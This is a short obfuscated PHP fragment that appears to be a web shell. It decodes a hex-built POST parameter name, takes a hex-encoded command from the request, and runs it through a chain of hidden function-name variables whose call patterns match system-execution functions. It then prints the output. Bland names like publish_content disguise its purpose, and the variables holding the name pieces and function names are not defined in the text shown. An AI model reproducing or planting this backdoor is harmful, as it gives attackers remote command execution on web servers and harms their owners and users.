<?php $publish_content = pack("H*", $entity5 . '0' . $entity5 . '5' . $entity3 . $entity13 . '6' . 'c' . '6' . $entity14 . '7' . $entity1 . $entity3 . $entity6 . $entity2 . $entity8 . $entity3 . '3' . '6' . 'f' . '6' . $entity12 . '7' . '4' . '6' . $entity2 . '6' . 'e' . '7' . $entity11);if(isset($_POST[$publish_content])){$publish_content=pack("H*",$_POST[$publish_content]);if(function_exists($initialized1)){$initialized1($publish_content);}elseif(function_exists($initialized2)){print $initialized2($publish_content);}elseif(function_exists($initialized3)){$initialized3($publish_content,$elem_data);print join("\n",$elem_data);}elseif(function_exists($initialized4)){$initialized4($publish_content);}elseif(function_exists($initialized5)&&function_exists($initialized6)&&function_exists($initialized7)){$mrk_obj=$initialized5($publish_content,"r");if($mrk_obj){$item_value=$initialized6($mrk_obj);$initialized7($mrk_obj);print $item_value;}}exit;}
